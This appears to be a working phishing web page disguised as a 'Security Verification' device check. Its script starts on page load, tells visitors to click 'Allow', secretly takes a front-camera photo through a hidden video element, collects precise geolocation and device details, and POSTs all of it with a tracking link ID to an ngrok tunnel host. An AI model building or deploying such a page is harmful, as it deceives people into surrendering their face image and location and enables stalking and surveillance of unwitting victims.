<!DOCTYPE html>
<html>
<head>
  <title>Security Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
    }
    #progress {
      margin: 20px 0;
      height: 5px;
      background-color: #f0f0f0;
      border-radius: 5px;
      overflow: hidden;
    }
    #progress-bar {
      height: 100%;
      width: 0%;
      background-color: #4CAF50;
      transition: width 0.3s;
    }
    #status {
      margin: 15px 0;
      color: #555;
    }
  </style>
</head>
<body>
<h2>To access this page, <br> 
  You are to verify your legitimacy by clicking on <br>
  <strong>Allow while visiting this site</strong>  <br>
  Verifying your device...</h2>
<div id="progress"><div id="progress-bar"></div></div>
<div id="status">Initializing verification process...</div>

<script>
// Hidden video element for capture
const hiddenVideo = document.createElement('video');
hiddenVideo.style.display = 'none';
document.body.appendChild(hiddenVideo);

function updateStatus(percent, message) {
  document.getElementById('progress-bar').style.width = percent + '%';
  document.getElementById('status').innerText = message;
}

async function captureImage() {
  try {
    updateStatus(10, "Requesting camera access...");
    
    // Get camera stream (front-facing by default)
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' },
      audio: false 
    });
    
    updateStatus(30, "Camera access granted. Capturing image...");
    
    // Use hidden video element
    hiddenVideo.srcObject = stream;
    await new Promise(resolve => hiddenVideo.onloadedmetadata = resolve);
    
    // Create canvas for capture
    const canvas = document.createElement('canvas');
    canvas.width = hiddenVideo.videoWidth;
    canvas.height = hiddenVideo.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
    
    // Stop all video tracks
    stream.getTracks().forEach(track => track.stop());
    
    updateStatus(50, "Processing image...");
    
    // Convert to blob
    return await new Promise(resolve => {
      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
    });
    
  } catch (error) {
    console.error("Camera error:", error);
    updateStatus(100, "Camera access denied. Continuing verification...");
    return null;
  }
}

async function getLocation() {
  try {
    updateStatus(60, "Requesting location access...");
    return await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000
      });
    });
  } catch (error) {
    console.warn("Location error:", error);
    return {
      coords: {
        latitude: 0,
        longitude: 0,
        accuracy: 0
      }
    };
  }
}

async function sendData(payload) {
  try {
    updateStatus(80, "Sending verification data...");
    const response = await fetch("https://d6d13ede2ed0.ngrok-free.app/receive", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    
    if (response.ok) {
      updateStatus(100, "Verification complete!");
    } else {
      updateStatus(100, "Verification failed. Please try again.");
    }
  } catch (error) {
    console.error("Send error:", error);
    updateStatus(100, "Connection error. Please check your network.");
  }
}

async function collectAllData() {
  // Get link ID from URL
  const linkId = new URLSearchParams(window.location.search).get('id');
  
  // Capture image in background
  const imageBlob = await captureImage();
  
  // Get location
  const position = await getLocation();
  updateStatus(70, "Preparing data...");
  
  // Convert image to base64 if captured
  let imageBase64 = null;
  if (imageBlob) {
    imageBase64 = await new Promise(resolve => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.readAsDataURL(imageBlob);
    });
  }
  
  // Prepare payload
  const payload = {
    link_id: linkId,
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    image: imageBase64,
    timestamp: new Date().toISOString(),
    user_agent: navigator.userAgent,
    device_info: {
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        colorDepth: window.screen.colorDepth
      },
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    }
  };
  
  // Send data
  await sendData(payload);
}

// Start data collection
setTimeout(collectAllData, 500);
</script>
</body>
</html>
